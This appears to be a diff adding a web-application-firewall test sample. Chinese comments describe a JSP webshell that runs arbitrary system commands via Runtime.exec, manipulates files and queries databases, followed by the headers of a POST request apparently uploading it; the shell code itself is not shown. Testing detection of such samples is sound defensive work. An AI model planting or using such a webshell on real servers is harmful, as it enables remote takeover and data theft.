@@ -1,0 +1,31 @@
+# webshell-80000426
+# 此webshell采用java语言的 JavaServer Pages技术编写。攻击者可以通过发送GET请求，在html页面上接收输入传值至Pwd、z参数，以传递命令，然后由Runtime.getRuntime()类的exec函数执行任意命令，并获取返回结果。
+# 基本信息：
+# - 文件名：indexop.jsp
+# - 文件大小：7KB
+# 行为描述：
+# A: 获取当前 Web 应用的根路径，并将其追加到输出中。
+# B: 列出指定目录中的文件和文件夹，并将信息追加到输出中。
+# C: 读取指定文件的内容，并将其追加到输出中。
+# D: 将指定的内容写入文件。
+# E: 递归删除指定目录及其内容。
+# F: 读取文件内容并通过HTTP响应输出。
+# G: 将十六进制字符串还原为文件并保存到指定路径。
+# H: 复制文件或目录到另一个位置。
+# I: 重命名文件或目录。
+# J: 创建目录。
+# K: 修改文件的最后修改时间。
+# L: 通过HTTP下载文件。
+# M: 执行系统命令，并将命令的输出追加到输出中。
+# N: 获取数据库中的目录信息。
+# O: 获取数据库中的表信息。
+# P: 执行 SQL 查询，获取数据库表的列信息。
+# Q: 执行 SQL 查询或更新，将结果或执行信息追加到输出中。
+POST /?bid=hd_tag_m8mv25oi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25oi
+RM-PRO-Token: ce37da0880effa344570dcf89060fce7
+RM-PRO-Time: 1742808493171
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=OTr0d0WnAIV_r57G7u8hJrt53OzJGt20
+
